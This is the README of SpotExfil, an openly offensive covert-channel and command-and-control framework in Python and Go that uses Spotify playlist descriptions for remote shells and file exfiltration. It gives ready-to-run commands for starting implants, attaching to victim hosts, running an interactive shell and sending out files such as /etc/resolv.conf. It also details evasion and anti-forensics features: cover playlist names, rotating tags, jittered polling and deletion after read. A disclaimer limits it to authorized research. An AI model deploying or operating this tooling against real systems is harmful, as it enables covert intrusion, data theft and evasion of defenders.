[![CodeQL](https://github.com/sourcefrenchy/spotexfil/actions/workflows/codeql-analysis.yml/badge.svg)](https://github.com/sourcefrenchy/spotexfil/actions/workflows/codeql-analysis.yml)

# SpotExfil

A proof-of-concept covert channel and C2 framework that uses Spotify playlist descriptions as a communication medium, 512 characters at a time.

Available as both **Python** and **Go** implementations with wire-compatible encrypted payloads.

More info at [Exfiltration Series: SpotExfil](https://medium.com/@jeanmichel.amblat/exfiltration-series-spotexfil-9aee76382b74)

## Features

### Encryption and Opsec
- **AES-256-GCM encryption** with PBKDF2-SHA256 key derivation (480K iterations)
- **Rotating HMAC tags** -- C2 playlist identifiers rotate hourly, preventing long-term traffic correlation
- **Auto-generated session keys** -- implant generates a NATO-phonetic passphrase on startup (never in argv)
- **Session binding** -- all commands/results tied to a crypto-random session ID, preventing replay
- **Timestamp validation** -- commands older than 5 minutes are rejected
- **HMAC-SHA256 client IDs** -- 64-bit collision-resistant agent identifiers (keyed, unforgeable)
- **BLAKE2b integrity verification** on encode and decode
- **Gzip compression** reduces payload size 60-80% for text

### C2 Framework
- **Multi-agent support** -- `agents`, `attach <id>`, `detach` for managing multiple implants
- **Interactive shell** (`ishell`) -- remote shell with command queuing, auto-detects bash/powershell
- **Direct shell on attach** -- type commands directly when attached (no `shell` prefix needed)
- **Auto check-in** -- implants announce themselves, operator sees connections in real-time
- **Modules**: shell (exec commands), exfil (read files), sysinfo (OS/network recon)
- **Smart rate limiting** -- exponential backoff, human-readable error messages, auto-recovery

### Infrastructure
- **Dual language** -- Python package + standalone Go binary (no runtime needed)
- **Cross-platform binaries** -- macOS (Apple Silicon), Linux (x64), Windows (x64), stripped
- **Stealth** -- cover playlist names, random filler tracks, jittered polling, aggressive cleanup
- **Config file support** (`~/.spotexfil.conf`) so env vars are optional

## Architecture

```
spotexfil/
├── shared/                  # Wire format specs (single source of truth)
│   ├── protocol.json        # Crypto constants, transport params
│   ├── modules.yaml         # C2 module definitions
│   └── test_vectors/        # Cross-language crypto validation
├── python/                  # Python implementation
│   ├── spotexfil/           # Package with ABCs, crypto, transport, C2
│   │   ├── interfaces.py    # CryptoProvider, Transport, C2Module ABCs
│   │   ├── crypto.py        # AES-GCM, PBKDF2, BLAKE2b
│   │   ├── transport.py     # Spotify API wrapper
│   │   ├── protocol.py      # C2 message serialization
│   │   ├── implant.py       # C2 implant daemon
│   │   ├── operator.py      # C2 operator console
│   │   ├── modules/         # Pluggable module registry
│   │   └── cli.py           # Unified CLI
│   └── tests/               # 156+ tests
├── go/                      # Go implementation
│   ├── cmd/spotexfil/       # Cobra CLI
│   ├── internal/
│   │   ├── crypto/          # AES-GCM, PBKDF2, BLAKE2b, HMAC
│   │   ├── encoding/        # File exfil pipeline
│   │   ├── protocol/        # C2 messages, encrypted descriptions
│   │   ├── spotify/         # zmb3/spotify/v2 wrapper
│   │   └── c2/              # Implant, operator, module registry
│   └── go.mod
├── Makefile                 # Build + test both languages
└── README.md
```

## Prerequisites

1. Register an app at [Spotify Developer Dashboard](https://developer.spotify.com/dashboard/)
2. Add redirect URI (e.g., `http://127.0.0.1:8888/callback`)
3. Provide credentials via env vars or `~/.spotexfil.conf`:

```bash
export SPOTIFY_USERNAME=YourUsername
export SPOTIFY_CLIENT_ID=your_client_id
export SPOTIFY_CLIENT_SECRET=your_client_secret
export SPOTIFY_REDIRECTURI=http://127.0.0.1:8888/callback
```

Or create `~/.spotexfil.conf`:

```ini
[spotify]
username = YourUsername
client_id = your_client_id
client_secret = your_client_secret
redirect_uri = http://127.0.0.1:8888/callback
```

## Installation

### Go (pre-built binaries, no runtime needed)

Download the appropriate binary from `dist/`:
- `spotexfil-darwin-arm64` -- macOS Apple Silicon
- `spotexfil-linux-amd64` -- Linux x64
- `spotexfil-windows-amd64.exe` -- Windows x64

### Python (from source)

```bash
cd python && pip install -r requirements.txt
```

### Build from source

```bash
make all          # Cross-compile Go binaries for all platforms
make test         # Run both Python and Go test suites
make lint         # Flake8 Python code
```

## Usage

### C2 Mode

```bash
# Terminal 1: Start implant (auto-generates session key)
./spotexfil-darwin-arm64 c2-implant --interval 30 --jitter 10

# Output:
# [*] Session key: bravo-kilo-seven-echo-tango-lima
# [*] Use this key to start the operator:
#     ./spotexfil c2-operator -k "bravo-kilo-seven-echo-tango-lima"
# [*] Polling every 20-40s
# [*] Session: a3f2b7c91e04
# [*] Check-in sent (client_id=7f3a2b1c9e04d8f1) at 15:30:05

# Terminal 2: Operator (use the key shown by implant)
./spotexfil-darwin-arm64 c2-operator -k "bravo-kilo-seven-echo-tango-lima" --poll-interval 30

# Alternative: key from file or env var
./spotexfil-darwin-arm64 c2-operator --key-file /path/to/keyfile
SPOTEXFIL_KEY="bravo-kilo-seven-echo-tango-lima" ./spotexfil-darwin-arm64 c2-operator
```

### Operator Console

```
  ┌─────────────────────────────────────────────┐
  │  ___            _   ___       __ _ _        │
  │ / __|_ __  ___ | |_| __|__ _/ _(_) |       │
  │ \__ \ '_ \/ _ \|  _| _|\ \ /  _| | |      │
  │ |___/ .__/\___/ \__|___/_\_\_| |_|_|_|      │
  │     |_|                                     │
  │         C2 OPERATOR CONSOLE                 │
  └─────────────────────────────────────────────┘

  Polling every 30s | Type 'help' for commands

[+] New implant connected!
    client_id : 7f3a2b1c9e04d8f1
    session   : a3f2b7c91e04
    hostname  : target.local
    os        : darwin/arm64
    user      : admin
    timestamp : 2026-04-18 15:30:05

[15:30] c2> agents

  ID               HOSTNAME         OS                   USER       CONNECTED
  ---------------- ---------------- -------------------- ---------- -------------------
  7f3a2b1c9e04d8f1 target.local     darwin/arm64         admin      2026-04-18 15:30:05

[15:30] c2> attach 7f3a
[*] Attached to 7f3a2b1c9e04d8f1 (target.local)
[15:30] 7f3a2b1c@target.local > whoami
[*] Command queued: seq=1 module=shell
[15:30] 7f3a2b1c@target.local > uname -a
[*] Command queued: seq=2 module=shell
[15:30] 7f3a2b1c@target.local > sysinfo
[*] Command queued: seq=3 module=sysinfo
[15:30] 7f3a2b1c@target.local > results
[15:30] 7f3a2b1c@target.local > detach
[*] Detached from 7f3a2b1c9e04d8f1 (target.local)
[15:31] c2>
```

### Interactive Shell (ishell)

```
[15:31] 7f3a2b1c@target.local > ishell

[*] Interactive shell to target.local (darwin/arm64)
[*] Shell: bash | Commands queue automatically | 'quit' to exit

7f3a2b1c@target.local $ ls -la /tmp
  -> queued seq=4
7f3a2b1c@target.local $ cat /etc/hosts
  -> queued seq=5
[queued: 2] 7f3a2b1c@target.local $

$ ls -la /tmp
drwxrwxrwt  12 root  wheel  384 Apr 18 15:31 .
...

$ cat /etc/hosts
127.0.0.1       localhost

7f3a2b1c@target.local $ quit
[*] Leaving interactive shell
```

### Available Commands

```
Agent management:
  agents          List connected implants
  attach <id>     Attach to an agent (prefix match, e.g. 'attach 7f3a')
  detach          Detach from current agent

Commands (when attached, type directly or use prefix):
  ishell          Interactive remote shell (auto-detects bash/powershell)
  <any command>   Sent as shell command to attached agent
  exfil <path>    Exfiltrate a file
  sysinfo         Gather system info

History:
  history         Show command history (last 20, persisted across restarts)
  shellhist       Alias for history
  result <seq>    Show detailed result for a specific seq number

Other:
  results         Poll for pending results
  wait <seq>      Wait for a specific result
  status          Show agents and pending commands
  clean           Remove all C2 playlists
  help            Show this help
  quit / exit     Exit the console
```

### Data Exfiltration Mode

```bash
# Send (encrypted + compressed, cover names)
./spotexfil-darwin-arm64 send -f /etc/resolv.conf -k "passphrase"

# Receive and decrypt
./spotexfil-darwin-arm64 receive -k "passphrase" -o output.txt

# Clean up
./spotexfil-darwin-arm64 clean
```

## Security Model

### Encryption
- All payloads: AES-256-GCM with PBKDF2-SHA256 (480K iterations)
- C2 metadata: AES-256-GCM with HMAC-derived fast key (no PBKDF2 per-playlist)
- Forward secrecy: X25519 ECDH key exchange + HKDF-SHA256 session keys
- Integrity: BLAKE2b-160 hash verified on decode

### Opsec Features
| Feature | Description |
|---------|-------------|
| Forward secrecy | X25519 ECDH per session — past traffic undecryptable even if master key leaks |
| Rotating tags | C2 playlist identifiers rotate hourly via time-windowed HMAC |
| Auto-generated keys | Implant generates NATO-phonetic passphrase (never in argv/ps) |
| Session binding | Crypto-random session ID prevents replay and cross-session leaks |
| Timestamp validation | Commands older than 5 minutes rejected |
| HMAC-SHA256 client IDs | 64-bit keyed identifiers (unforgeable without the key) |
| Heartbeat checkins | Implant re-announces every 60s so new operators see it within a minute |
| Aggressive cleanup | Playlists deleted after read; orphaned results from dead sessions cleaned |
| Plugin modules | Modules loadable as .so plugins at runtime (linux/macOS) |
| Async execution | Commands run in goroutines; large exfils don't block command processing |
| Shutdown signal | Operator broadcasts encrypted shutdown on exit, implants auto-reconnect |
| Cover names | Innocuous playlist names ("Chill Vibes #a3f2") |
| Jittered polling | Configurable interval + random jitter |
| Exponential backoff | Independent read/write backoff with auto-recovery |
| Random OAuth state | No tool fingerprint in OAuth flow |

### Resilience
- **Operator restart**: implant heartbeats every 60s, new operator picks it up automatically
- **Operator Ctrl+C** (no clean shutdown): implant continues polling, re-checkins on heartbeat
- **Wrong key then correct key**: implant is invisible to wrong-key operator, visible to correct-key operator within 60s
- **Forward secrecy trade-off**: pending results from a dead operator session are lost (by design — ephemeral X25519 keys only exist in memory)

### API Optimization
Spotify rate limits: ~180 requests per rolling 30-second window per app.

| | Before | After |
|---|---|---|
| API calls per poll | 1 listing + N GetPlaylist (80+ on a real account) = **81 calls** | 1 listing + client-side tag filter = **1-3 calls** |
| Effective req/30s at --interval 30 | ~160 (near limit) | ~2 (well under) |
| Min safe interval | 60s+ | 20s |
| Write block behavior | Everything backs off, implant goes deaf | Reads keep polling, only writes back off independently |

The `SimplePlaylist` listing already includes the `description` field. C2 playlists are identified by their encrypted HMAC tag prefix client-side — no extra `GetPlaylist` API call needed. Personal playlists (80+) are skipped with zero API cost.

Read (polling for commands) and write (checkin, sending results) have **independent backoff timers**. A Spotify write block doesn't stop the implant from receiving and executing commands.

### What an analyst sees on Spotify
- Private playlists with names like "Morning Coffee #b7c2"
- Descriptions are opaque encrypted blobs (HMAC tag + AES-GCM ciphertext)
- No plaintext metadata, no sequential naming, no detectable patterns
- Playlists are deleted within seconds of being read
- HMAC tag rotates hourly — no permanent correlation across time windows

## Testing

```bash
make test         # Run everything (Python 157+ tests + Go tests)
make test-python  # Python only
make test-go      # Go only
make lint         # Flake8
```

Test coverage includes:
- **Crypto**: AES-GCM, PBKDF2, BLAKE2b, HMAC, X25519 ECDH, HKDF session key derivation
- **Forward secrecy**: full key exchange simulation, session isolation, forward secrecy property verification
- **Protocol resilience**: raw encode/decode, master-key fallback, operator restart scenario, implant fallback decryption
- **Module registry**: dynamic register/unregister, concurrent access (race detector)
- **Integration**: full C2 roundtrips, multi-command queue, channel isolation, cleanup
- **Stress**: 100+ random payloads, concurrent encoding, edge cases
- **Interop**: cross-language crypto validation against shared test vectors

## Cross-Language Interop

Python and Go implementations are wire-compatible:
- **Go operator** sends commands to **Python implant**
- **Python operator** sends commands to **Go implant**
- File exfil payloads interchangeable
- Shared test vectors enforce crypto compatibility

## Limitations

- ~1MB max payload (~2000 playlists)
- Slow for large files (1 API call per 512-char chunk)
- Spotify rate limits: ~180 req/30s rolling window, write blocks can escalate to 24h
- C2 polling adds latency (configurable, default 20-60s)

## Disclaimer

This is a **proof-of-concept for educational and authorized security research purposes only**. Do not use for unauthorized data exfiltration or unauthorized access to computer systems. The author is not responsible for misuse.

## TODO

- Account rotation support
- Additional C2 modules (screenshot, persistence)
- Multi-account relay / dead drops
- Optional session key persistence for result recovery across operator restarts
- Steganographic payload encoding
